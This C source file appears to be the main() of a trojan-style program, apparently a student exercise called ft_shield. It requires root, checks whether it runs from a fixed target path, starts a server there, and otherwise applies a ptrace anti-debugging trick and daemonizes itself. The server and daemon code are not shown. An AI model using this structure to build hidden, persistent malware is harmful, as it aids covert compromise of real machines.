#include <ft_shield.h>

int main(void)
{
	ssize_t	len;
	char exec_path[256];

	if (getuid())
		return (EXIT_FAILURE);
	if ((len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1)) < 0)
		return (EXIT_FAILURE);
	exec_path[len] = '\0';
	if (strcmp(exec_path, TARGET_PATH) == 0)
		server();
	else {
		write(1, "rorozco- & rcabezas\n", 20);
		if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
			return EXIT_FAILURE;
		daemonize();
	}
	return EXIT_SUCCESS;
}
